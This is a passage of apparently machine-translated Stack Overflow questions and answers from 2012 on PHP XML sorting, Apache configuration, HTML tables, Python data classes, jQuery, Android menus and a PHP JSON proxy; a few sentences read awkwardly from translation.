Truth: Red, White & Black
 1\. id: 3750
 2\. id: 3751 
```

该[`xpath_string`函数的代码可以在我的另一个答案中找到](https://stackoverflow.com/a/12810818/367456)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:39:59.017

您可以使用

```
$key = "id" ;
$iterator = new SimpleXMLIterator($xml);
$array = json_decode(json_encode($iterator), TRUE);
__xsort($array['comic'],"id") ;
var_dump($array['comic']); 
```

输出

```
array
  0 => 
    array
      'id' => string '1' (length=1)
      'mainsection' => 
        array
          'series' => 
            array
              ...
  1 => 
    array
      'id' => string '2' (length=1)
      'mainsection' => 
        array
          'series' => 
            array
              ...
  2 => 
    array
      'id' => string '3' (length=1)
      'mainsection' => 
        array
          'series' => 
            array
              ...
  3 => 
    array
      'id' => string '10' (length=2)
      'mainsection' => 
        array
          'series' => 
            array
              ...
  4 => 
    array
      'id' => string '12' (length=2)
      'mainsection' => 
        array
          'series' => 
            array
              ... 
```

使用的 XML

```
$xml = "<comics>
<comic>
      <id>1</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure - 1</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
    </comic>

<comic>
      <id>10</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure - 10</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
    </comic>

<comic>
      <id>12</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure 12</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
    </comic>

<comic>
      <id>2</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure 2</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
    </comic>

<comic>
      <id>3</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure 3</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
    </comic>

</comics>" ; 
```

[__xsort 使用的函数](https://stackoverflow.com/a/12759674/1226894)

# linux - 重新启动新安装的 Apache2 服务器 (Linux Mint) 时出错

> ID：12760987
> 
> 赞同：2
> 
> 时间：2012-10-06T15:13:01.243
> 
> 标签：linux, apache2

我最近安装了 Apache2，它运行良好，我可以重新启动它和一切。然后我安装了 MySQL - 0 错误。

当我安装 phpmyadmin 时，我被告知添加以下内容

```
> Include /etc/phpmyadmin/apache.conf 
```

就在这下面

```
#Include the virtual host configurations:
/etc/apache2/sites-enabled/
/etc/phpmyadmin/apache.conf 
```

但它似乎以某种方式破坏了我的脚本，我不太确定如何修复它

```
> 
> Syntax error on line 230 of /etc/apache2/apache2.conf: Invalid command
> '/etc/apache2/sites-enabled/', perhaps misspelled or defined by a
> module not included in the server configuration Action 'configtest'
> failed. The Apache error log may have more information.    ...fail! 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T15:21:45.243

你省略了`Include`指令。

```
#Include the virtual host configurations:
Include /etc/apache2/sites-enabled/
Include /etc/phpmyadmin/apache.conf 
```

# html - HTML表格添加额外的th

> ID：12760989
> 
> 赞同：-1
> 
> 时间：2012-10-06T15:13:36.197
> 
> 标签：html

好的，我一直在看这段代码，但我不明白为什么它会添加重复的 th。表格数据没有添加任何额外的 td，所以我有点难过。这可能是由于在某处缺少元素吗？我不认为我的 PHP 代码会影响它。

```
<!doctype html>
<html>
<head>
<title></title>
<meta charset="utf-8">
<meta name="description" content="">
<link rel="stylesheet" type="text/css" href="css/reset.css">
<link rel="stylesheet" type="text/css" href="css/master.css">
</head>
<body>
<?php

//header("Content-type: application/vnd.ms-excel");
//header("Content-Disposition: attachment; filename=excel.xls");

include('queries.php');
$role = $_POST["role"];
$menu = $_POST["menu"];

$tests = getTestCases($role, $menu);
?>
<form action="testCaseToExcel.php" method="post">
<input type="submit" value="Download to Excel" />
</form>
<table border="1" style="width: 100%;">
<thead>
<tr>
    <th>Role<th>
    <th>Path<th>
    <th>Link<th>
    <th>Link Type<th>
</tr>
</thead>
<?php
    foreach ($tests as $test) { ?>
        <tr>
            <td>
                <?php echo $test->role;?>
            </td>
            <td>
                <?php echo $test->path;?>
            </td>
            <td>
                <?php echo $test->link_name;?>
            </td>
            <td>
                <?php echo $test->link_type;?>
            </td>
        </tr>
    <?php }
?>
</table>
<form action="testCaseToExcel.php" method="post">
<input type="submit" value="Download to Excel" />
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:40:17.573

您未能关闭任何`<th>`标签。应该：

```
<tr>
    <th>Role</th>
    <th>Path</th>
    <th>Link</th>
    <th>Link Type</th>
</tr> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:35:04.980

好像你正在犯一个 html 语法错误

```
<tr>
    <th>Role<th>
    <th>Path<th>
    <th>Link<th>
    <th>Link Type<th>
</tr> 
```

在您的代码中进行以下更改，我认为您应该对标题选项卡使用结束标签，看看它可能会有所帮助

```
<tr>
    <th>Role</th>
    <th>Path</th>
    <th>Link</th>
    <th>Link Type</th>
</tr> 
```

# visual-studio-2012 - CodeRush Xpress 是否与 Visual Studio 2012 兼容

> ID：12760990
> 
> 赞同：11
> 
> 时间：2012-10-06T15:13:43.793
> 
> 标签：visual-studio-2012, coderush-xpress

CodeRush Xpress（CodeRush 的免费版）是否与 Visual Studio 2012 兼容？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-01-16T22:11:10.500

Alex Skorkin的[官方回应](https://stackoverflow.com/a/12764153/238753)是不支持：

> 恐怕 CodeRush Xpress 在 Visual Studio 2012 中不可用。

但是，[它实际上是](https://stackoverflow.com/questions/12760990/is-coderush-xpress-compatible-with-visual-studio-2012/21173982#comment17797351_12764153)并且[已经得到支持](https://www.devexpress.com/Support/Center/Question/Details/Q441775)。只需像往常一样[下载](http://go.devexpress.com/CodeRushX.aspx)并安装它。[一位工作人员最终证实了这一点](https://www.devexpress.com/Support/Center/Question/Details/Q478273#comment-77535753-e3e3-11e2-bf4c-f0bf97cd2e09)：

> 最新版本的 CodeRush Xpress (11.2.13) 支持 Visual Studio 2012。

[官方页面](https://www.devexpress.com/Products/Visual_Studio_Add-in/CodeRushX/)还带有以下徽章：

> 完全支持 Visual Studio 2012

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T21:46:07.250

恐怕 CodeRush Xpress 在 Visual Studio 2012 中不可用。

# python - Python：数据对象或类

> ID：12760993
> 
> 赞同：6
> 
> 时间：2012-10-06T15:13:58.450
> 
> 标签：python, class, dictionary

我喜欢所有用于抓取网站的 python 库，我正在尝试使用 BeautifulSoup 和 IMDB 只是为了好玩。

由于我来自 Java，因此我的编程风格中融入了一些 Java 实践。我正在尝试获取某部电影的信息，我可以创建一个 Movie 类，也可以只使用带有属性键的字典。

我的问题是，当一个类只包含数据并且可能几乎没有行为时，我应该只使用字典吗？在其他语言中，创建类型将帮助您强制执行某些限制，并且由于类型检查，IDE 将帮助您编程，这在 python 中并非总是如此，所以我该怎么办？

只有当行为和数据都存在时，我才应该求助于创建一个类？或者创建一个电影类，即使它可能只是一个数据容器？

这一切都取决于您的模型，在这种特殊情况下，任何一个都可以，但我想知道什么是好的做法。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-06T15:18:25.740

使用一个类来存储属性很好。您可能还希望改用[命名元](http://docs.python.org/library/collections.html#namedtuple-factory-function-for-tuples-with-named-fields)组

dict 和 class 之间的主要区别在于您访问属性`[]`与`.`继承的方式。

`instance.__dict__``dict`毕竟只是一个

如果您愿意，您甚至可以对所有这些类型的对象使用一个类

```
class Bunch:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

movie = Bunch(title='foo', director='bar', ...) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:02:03.453

`dict`如果已经提供了您需要的东西，这取决于您对“可能几乎没有行为”的真正含义。否则考虑子类`dict`添加您的特定行为。从 Python 2.2[开始，它是可能的](http://www.python.org/download/releases/2.2/descrintro/#subclassing)。使用`UserDict`是解决问题的一种较旧的方法。

您还可以使用普通字典并通过某些函数在外部实现该行为。我使用这种方法进行原型设计，并最终在稍后重构代码以使其面向对象（通常更具可扩展性）。

您可以在解释器中查看字典提供的内容：

```
>>> help({}) 
```

或[参考文档](http://docs.python.org/tutorial/datastructures.html#dictionaries)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:20:11.873

在您的情况下，您可以使用继承自`dict`（例如`class MyClass(dict)`）的类，以便您可以为类似 dict 的类定义自定义行为或使用[UserDict](http://docs.python.org/library/userdict.html#module-UserDict)。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-10-06T15:25:27.983

我会坚持亲吻（保持简单愚蠢）。如果您只想存储值，最好使用字典，因为您可以在运行时动态添加值。错误：（但您不能在运行时向类添加新字段。）

因此，如果类提供状态和行为，它们就会很有用。

编辑：您可以将字段添加到 python 中的类。

# javascript - 创建点击 div

> ID：12760995
> 
> 赞同：-2
> 
> 时间：2012-10-06T15:14:02.233
> 
> 标签：javascript, css, html, styles

我想创建两个 div。Div A 和 Div B. Div A 位于 Div B 的顶部，因此 Div A 完全覆盖 Div B 。我想要实现的是 - 应该点击 Div A，以便我可以点击位于 Div A 下的 div B。

仅供参考-我不想隐藏 div A。它应该在那里，但应该能够直接点击它。

任何帮助表示赞赏。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:17:52.227

我建议其他寻找类似功能的人这样做。使用 jQuery，以便您能够捕获覆盖 div 上的单击事件并将其委托给底层 div 以模拟此

```
$(document).ready(function(){
   $('#myDiv').click(function(event){ 
     event.preventDefault(); 
     $('#myOtherDiv').trigger(event); 
   });

}); 
```

沿着这些思路（使用 .trigger 或仅 .click 底层 div）

# android - 较新设备的菜单按钮的解决方法

> ID：12760996
> 
> 赞同：0
> 
> 时间：2012-10-06T15:14:12.733
> 
> 标签：android, android-actionbar, android-menu

我是 Android 应用程序开发的新手，最近发布了我的第一个应用程序。我的应用程序使用菜单键显示 2-3 个功能。但也有 HTC Evo 4G 用户向我发送电子邮件抱怨他们无法使用它，因为他们的设备没有物理菜单键。现在我如何以最好的方式实施解决方案？该应用程序支持设备 android 2.2+ 如何在不破坏我的应用程序的情况下添加操作栏？我想知道是否应该为所有 android 版本或仅为 4.0 及更高版本添加操作栏？什么会更容易？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:24:43.423

> 我的应用程序使用菜单键显示 2-3 个功能。

它应该通过使用标准选项菜单系统来做到这一点。

> 现在我如何以最好的方式实施解决方案？

添加`android:targetSdkVersion="11"`（或更高版本）到`<uses-sdk>`清单中的元素。您的标题栏将自动转换为 API Level 11+ 设备上的操作栏，并且您的选项菜单将显示为操作栏中的溢出菜单。

> 如何在不破坏我的应用程序的情况下添加操作栏？

往上看。

> 我想知道是否应该为所有 android 版本添加一个操作栏

您当然可以使用[ActionBarSherlock](http://actionbarsherlock.com/)之类的库来做到这一点。

# php - 为 Jquery 创建包装器

> ID：12760997
> 
> 赞同：0
> 
> 时间：2012-10-06T15:14:14.293
> 
> 标签：php, jquery, jsonp

我有一个我想使用的 API。在网络浏览器中，我可以返回：

```
{"files":[{"number":0,"timestamp":1349507580,"time":"20121006071300"},
{"number":1,"timestamp":1349506980,"time":"20121006070300"},
{"number":2,"timestamp":1349506320,"time":"20121006065200"},
{"number":3,"timestamp":1349505720,"time":"20121006064200"},
{"number":12,"timestamp":1349499120,"time":"20121006045200"},
{"number":99,"timestamp":1349446920,"time":"20121005142200"}]} 
```

服务器拒绝这样包装：

```
callback( ABOVE DATA ) 
```

我试图在我的本地主机上创建一个 php 代理来返回 jsonp 数据和一个回调函数，但它不能正常工作。

返回正确 jsonp 数据的最少 php 代码是多少？

此外，至少需要使用 ($.ajax) 的哪一行 jQuery 来使用警报输出？

我只是想让这个工作，我做不到。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:18:02.090

如果你做了一个代理，那么就不会有跨域问题。不需要使用jsonp，只需获取json数据，然后回显即可。

```
header('Content-type: application/json');
echo file_get_contents($api_uri);
exit; 
```